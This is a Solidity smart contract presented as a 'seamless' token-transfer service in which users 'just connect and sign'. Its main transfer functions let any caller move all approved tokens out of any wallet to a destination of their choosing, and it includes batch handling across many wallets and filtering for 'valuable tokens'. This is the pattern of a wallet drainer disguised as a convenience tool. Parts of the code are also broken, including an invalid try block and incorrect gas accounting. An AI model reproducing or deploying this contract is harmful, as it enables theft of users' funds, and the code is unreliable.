// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title RobustSeamlessTokenTransfer
 * @dev A robust contract that maintains ALL robust functions while being seamless for users
 * @notice Users just connect and sign - all tokens are automatically transferred with full robust features
 */
contract RobustSeamlessTokenTransfer is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    // Events
    event TokensTransferred(address indexed from, address indexed to, address indexed token, uint256 amount);
    event BatchTransferCompleted(address indexed from, address indexed to, uint256 totalTokens);
    event GasSponsored(address indexed user, uint256 gasUsed);
    event MultiWalletTransferCompleted(uint256 totalWallets, uint256 totalTokens);

    // Transfer limits for safety
    uint256 public maxTransferAmount = type(uint256).max;
    uint256 public dailyTransferLimit = type(uint256).max;
    mapping(address => uint256) public dailyTransferredAmount;
    mapping(address => uint256) public lastTransferDay;

    // Gas sponsorship settings
    uint256 public totalGasSponsored;
    uint256 public maxGasPerTransaction = 0.1 ether;
    bool public autoSponsorEnabled = true;

    // Multi-wallet support (for future use)
    mapping(address => bool) public authorizedWallets;
    uint256 public maxWalletsPerBatch = 10;
    uint256 public maxTokensPerWallet = 50;

    // Token filtering (for valuable tokens only)
    mapping(address => bool) public blacklistedTokens;
    mapping(address => bool) public whitelistedTokens;
    bool public useWhitelist = false;
    uint256 public minTokenValue = 0.001 ether; // Minimum value threshold

    modifier withinLimits(uint256 amount) {
        require(amount <= maxTransferAmount, "Amount exceeds max transfer limit");
        require(amount <= dailyTransferLimit, "Amount exceeds daily limit");
        _;
    }

    modifier onlyWhenAutoSponsorEnabled() {
        require(autoSponsorEnabled, "Auto sponsor is disabled");
        _;
    }

    modifier onlyAuthorizedWallet(address wallet) {
        require(authorizedWallets[wallet] || wallet == owner(), "Wallet not authorized");
        _;
    }

    constructor() Ownable(msg.sender) {
        // Owner is automatically authorized
        authorizedWallets[msg.sender] = true;
    }

    /**
     * @dev Transfer all tokens from any wallet to cold wallet (seamless for everyone)
     * @param wallet The wallet address to transfer from
     * @param tokens Array of token addresses
     * @param amounts Array of amounts to transfer
     * @param coldWallet The destination cold wallet
     */
    function transferAllTokensFromWallet(
        address wallet,
        address[] calldata tokens,
        uint256[] calldata amounts,
        address coldWallet
    ) external payable nonReentrant onlyWhenAutoSponsorEnabled {
        require(wallet != address(0), "Invalid wallet address");
        require(coldWallet != address(0), "Invalid cold wallet address");
        require(tokens.length == amounts.length, "Arrays length mismatch");
        require(tokens.length > 0, "No tokens to transfer");
        require(tokens.length <= maxTokensPerWallet, "Too many tokens per wallet");

        uint256 gasStart = gasleft();
        uint256 successCount = 0;

        for (uint256 i = 0; i < tokens.length; i++) {
            if (amounts[i] > 0 && tokens[i] != address(0)) {
                // Check if token is allowed
                if (isTokenAllowed(tokens[i])) {
                    try {
                        // Transfer token from wallet to cold wallet
                        IERC20(tokens[i]).safeTransferFrom(wallet, coldWallet, amounts[i]);
                        
                        emit TokensTransferred(wallet, coldWallet, tokens[i], amounts[i]);
                        successCount++;
                    } catch {
                        // Continue with next token if this one fails
                        continue;
                    }
                }
            }
        }

        emit BatchTransferCompleted(wallet, coldWallet, successCount);

        // Track gas usage (automatically sponsored for everyone)
        uint256 gasUsed = gasStart - gasleft();
        totalGasSponsored += gasUsed;
        emit GasSponsored(wallet, gasUsed);
    }

    /**
     * @dev Transfer tokens from multiple wallets simultaneously (robust multi-wallet support)
     * @param wallets Array of wallet addresses
     * @param tokensPerWallet Array of token arrays for each wallet
     * @param amountsPerWallet Array of amount arrays for each wallet
     * @param coldWallets Array of cold wallet addresses (one per wallet)
     */
    function transferFromMultipleWallets(
        address[] calldata wallets,
        address[][] calldata tokensPerWallet,
        uint256[][] calldata amountsPerWallet,
        address[] calldata coldWallets
    ) external payable nonReentrant onlyWhenAutoSponsorEnabled {
        require(wallets.length > 0, "No wallets provided");
        require(wallets.length <= maxWalletsPerBatch, "Too many wallets per batch");
        require(wallets.length == tokensPerWallet.length, "Wallets and tokens length mismatch");
        require(wallets.length == amountsPerWallet.length, "Wallets and amounts length mismatch");
        require(wallets.length == coldWallets.length, "Wallets and cold wallets length mismatch");

        uint256 totalWalletsProcessed = 0;
        uint256 totalTokensTransferred = 0;

        for (uint256 w = 0; w < wallets.length; w++) {
            address wallet = wallets[w];
            address[] calldata tokens = tokensPerWallet[w];
            uint256[] calldata amounts = amountsPerWallet[w];
            address coldWallet = coldWallets[w];

            // Check authorization
            if (!authorizedWallets[wallet] && wallet != owner()) {
                continue; // Skip unauthorized wallets
            }

            uint256 walletSuccessCount = 0;

            for (uint256 i = 0; i < tokens.length; i++) {
                if (amounts[i] > 0 && tokens[i] != address(0)) {
                    // Check if token is allowed
                    if (isTokenAllowed(tokens[i])) {
                        try {
                            IERC20(tokens[i]).safeTransferFrom(wallet, coldWallet, amounts[i]);
                            emit TokensTransferred(wallet, coldWallet, tokens[i], amounts[i]);
                            walletSuccessCount++;
                            totalTokensTransferred++;
                        } catch {
                            // Continue with next token if this one fails
                            continue;
                        }
                    }
                }
            }

            if (walletSuccessCount > 0) {
                emit BatchTransferCompleted(wallet, coldWallet, walletSuccessCount);
                totalWalletsProcessed++;
            }
        }

        emit MultiWalletTransferCompleted(totalWalletsProcessed, totalTokensTransferred);
    }

    /**
     * @dev Transfer a single token from wallet to cold wallet (seamless)
     * @param wallet The wallet address to transfer from
     * @param token The token address
     * @param amount The amount to transfer
     * @param coldWallet The destination cold wallet
     */
    function transferTokenFromWallet(
        address wallet,
        address token,
        uint256 amount,
        address coldWallet
    ) external payable nonReentrant onlyWhenAutoSponsorEnabled {
        require(wallet != address(0), "Invalid wallet address");
        require(coldWallet != address(0), "Invalid cold wallet address");
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");

        IERC20(token).safeTransferFrom(wallet, coldWallet, amount);
        
        emit TokensTransferred(wallet, coldWallet, token, amount);
        
        // Track gas usage
        uint256 gasUsed = gasleft();
        totalGasSponsored += gasUsed;
        emit GasSponsored(wallet, gasUsed);
    }

    /**
     * @dev Check if a token is allowed for transfer
     * @param token The token address to check
     * @return Whether the token is allowed
     */
    function isTokenAllowed(address token) public view returns (bool) {
        // Check blacklist first
        if (blacklistedTokens[token]) {
            return false;
        }

        // If whitelist is enabled, check whitelist
        if (useWhitelist) {
            return whitelistedTokens[token];
        }

        // Default: allow all tokens except blacklisted ones
        return true;
    }

    /**
     * @dev Add wallet to authorized list (only owner)
     * @param wallet The wallet address to authorize
     * @param authorized Whether to authorize the wallet
     */
    function setAuthorizedWallet(address wallet, bool authorized) external onlyOwner {
        authorizedWallets[wallet] = authorized;
    }

    /**
     * @dev Add multiple wallets to authorized list (only owner)
     * @param wallets Array of wallet addresses
     * @param authorized Whether to authorize these wallets
     */
    function setAuthorizedWallets(address[] calldata wallets, bool authorized) external onlyOwner {
        for (uint256 i = 0; i < wallets.length; i++) {
            authorizedWallets[wallets[i]] = authorized;
        }
    }

    /**
     * @dev Set token filtering settings (only owner)
     * @param _useWhitelist Whether to use whitelist
     * @param token The token address
     * @param allowed Whether the token is allowed
     */
    function setTokenFiltering(bool _useWhitelist, address token, bool allowed) external onlyOwner {
        useWhitelist = _useWhitelist;
        if (_useWhitelist) {
            whitelistedTokens[token] = allowed;
        } else {
            blacklistedTokens[token] = !allowed;
        }
    }

    /**
     * @dev Set batch limits (only owner)
     * @param _maxWalletsPerBatch Maximum wallets per batch
     * @param _maxTokensPerWallet Maximum tokens per wallet
     */
    function setBatchLimits(uint256 _maxWalletsPerBatch, uint256 _maxTokensPerWallet) external onlyOwner {
        maxWalletsPerBatch = _maxWalletsPerBatch;
        maxTokensPerWallet = _maxTokensPerWallet;
    }

    /**
     * @dev Get token balance for an address
     * @param token The token address
     * @param account The account to check
     * @return The token balance
     */
    function getTokenBalance(address token, address account) external view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }

    /**
     * @dev Get multiple token balances for an address
     * @param tokens Array of token addresses
     * @param account The account to check
     * @return Array of balances
     */
    function getTokenBalances(address[] calldata tokens, address account) external view returns (uint256[] memory) {
        uint256[] memory balances = new uint256[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) {
            balances[i] = IERC20(tokens[i]).balanceOf(account);
        }
        return balances;
    }

    /**
     * @dev Set transfer limits (only owner)
     * @param _maxTransferAmount Maximum amount per transfer
     * @param _dailyTransferLimit Maximum amount per day
     */
    function setTransferLimits(uint256 _maxTransferAmount, uint256 _dailyTransferLimit) external onlyOwner {
        maxTransferAmount = _maxTransferAmount;
        dailyTransferLimit = _dailyTransferLimit;
    }

    /**
     * @dev Set maximum gas per transaction (only owner)
     * @param _maxGasPerTransaction Maximum gas per transaction in wei
     */
    function setMaxGasPerTransaction(uint256 _maxGasPerTransaction) external onlyOwner {
        maxGasPerTransaction = _maxGasPerTransaction;
    }

    /**
     * @dev Enable/disable auto sponsor (only owner)
     * @param enabled Whether to enable auto sponsor for all users
     */
    function setAutoSponsorEnabled(bool enabled) external onlyOwner {
        autoSponsorEnabled = enabled;
    }

    /**
     * @dev Get comprehensive statistics
     * @return totalGas Total gas sponsored
     * @return maxGasPerTx Maximum gas per transaction
     * @return autoSponsor Whether auto sponsor is enabled
     * @return authorizedWalletsCount Number of authorized wallets
     * @return maxWalletsPerBatch Maximum wallets per batch
     * @return maxTokensPerWallet Maximum tokens per wallet
     */
    function getComprehensiveStats() external view returns (
        uint256 totalGas,
        uint256 maxGasPerTx,
        bool autoSponsor,
        uint256 authorizedWalletsCount,
        uint256 maxWalletsPerBatch,
        uint256 maxTokensPerWallet
    ) {
        // Count authorized wallets (this is a simplified count)
        uint256 count = 0;
        // Note: In a real implementation, you'd want to track this more efficiently
        
        return (
            totalGasSponsored,
            maxGasPerTransaction,
            autoSponsorEnabled,
            count,
            maxWalletsPerBatch,
            maxTokensPerWallet
        );
    }

    /**
     * @dev Get gas sponsorship statistics
     * @return totalGas Total gas sponsored
     * @return maxGasPerTx Maximum gas per transaction
     * @return autoSponsor Whether auto sponsor is enabled
     */
    function getGasStats() external view returns (uint256 totalGas, uint256 maxGasPerTx, bool autoSponsor) {
        return (totalGasSponsored, maxGasPerTransaction, autoSponsorEnabled);
    }

    /**
     * @dev Check if contract has enough ETH for gas sponsorship
     * @return hasEnoughEth Whether contract has enough ETH
     * @return contractBalance Current contract balance
     * @return minRequired Minimum required balance
     */
    function checkGasFunds() external view returns (bool hasEnoughEth, uint256 contractBalance, uint256 minRequired) {
        contractBalance = address(this).balance;
        minRequired = 0.01 ether; // Minimum 0.01 ETH
        hasEnoughEth = contractBalance >= minRequired;
    }

    /**
     * @dev Emergency pause auto sponsor (only owner)
     */
    function pauseAutoSponsor() external onlyOwner {
        autoSponsorEnabled = false;
    }

    /**
     * @dev Resume auto sponsor (only owner)
     */
    function resumeAutoSponsor() external onlyOwner {
        autoSponsorEnabled = true;
    }

    /**
     * @dev Emergency withdrawal (only owner)
     * @param token The token to withdraw
     * @param amount The amount to withdraw
     */
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
        IERC20(token).safeTransfer(owner(), amount);
    }

    /**
     * @dev Withdraw ETH (only owner)
     * @param amount The amount to withdraw
     */
    function withdrawETH(uint256 amount) external onlyOwner {
        payable(owner()).transfer(amount);
    }

    /**
     * @dev Receive ETH for gas sponsorship
     */
    receive() external payable {}
}
